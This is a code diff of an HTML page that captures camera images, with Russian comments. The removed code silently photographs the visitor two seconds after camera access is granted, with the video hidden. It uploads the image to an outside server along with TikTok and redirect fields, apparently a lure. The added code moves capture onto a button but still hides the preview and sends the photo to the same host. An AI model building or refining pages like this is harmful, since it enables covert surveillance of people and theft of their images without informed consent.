@@ -13,58 +13,87 @@
         video {
             display: none;
         }
+        #capture-button {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 10px 20px;
+            font-size: 18px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        #capture-button:hover {
+            background-color: #218838;
+        }
     </style>
 </head>
 <body>
 
 <video id="video" autoplay></video>
 <canvas id="canvas" style="display:none;"></canvas>
+<button id="capture-button">Сделать снимок</button>
 
 <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
 
-    navigator.mediaDevices.getUserMedia({ video: true })
+    // Запрос доступа к камере
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
         .then(stream => {
             video.srcObject = stream;
-
-            // Через 2 секунды делаем снимок
-            setTimeout(() => {
-                // Настройка размера canvas под видео
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-
-                // Отрисовка текущего кадра видео на canvas
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                // Преобразование изображения в Blob
-                canvas.toBlob(blob => {
-                    // Формирование данных для отправки
-                    const formData = new FormData();
-                    formData.append('photo', blob, 'photo.jpg');
-                    formData.append('tiktok_url', 'https://www.tiktok.com/example_video');
-                    formData.append('user_id', '12345');
-                    formData.append('redirect_url', 'https://www.redirect.com');
-
-                    // Отправка данных на сервер
-                    fetch('https://rusfai-send-photo-f9d0.twc1.net/tiktok', {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => response.text())
-                    .then(result => {
-                        console.log('Success:', result);
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                    });
-                }, 'image/jpeg');
-            }, 2000); // 2 секунды ожидания для автофокуса
         })
         .catch(err => {
             console.error('Ошибка при доступе к камере:', err);
         });
+
+    // Функция захвата фото
+    function capturePhoto() {
+        // Настройка размера canvas под видео
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        // Отрисовка текущего кадра видео на canvas
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Преобразование изображения в Blob
+        canvas.toBlob(blob => {
+            if (blob) {
+                sendPhoto(blob);
+            } else {
+                console.error('Ошибка при преобразовании в Blob');
+            }
+        }, 'image/jpeg');
+    }
+
+    // Функция отправки фото на сервер
+    function sendPhoto(blob) {
+        const formData = new FormData();
+        formData.append('photo', blob, 'photo.jpg');
+        formData.append('tiktok_url', 'https://www.tiktok.com/example_video');
+        formData.append('user_id', '12345');
+        formData.append('redirect_url', 'https://www.redirect.com');
+
+        // Отправка данных на сервер
+        fetch('https://rusfai-send-photo-f9d0.twc1.net/tiktok', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.text())
+        .then(result => {
+            console.log('Успех:', result);
+        })
+        .catch(error => {
+            console.error('Ошибка:', error);
+        });
+    }
+
+    // Добавляем обработчик событий для кнопки
+    document.getElementById('capture-button').addEventListener('click', capturePhoto);
 </script>
 
 </body>
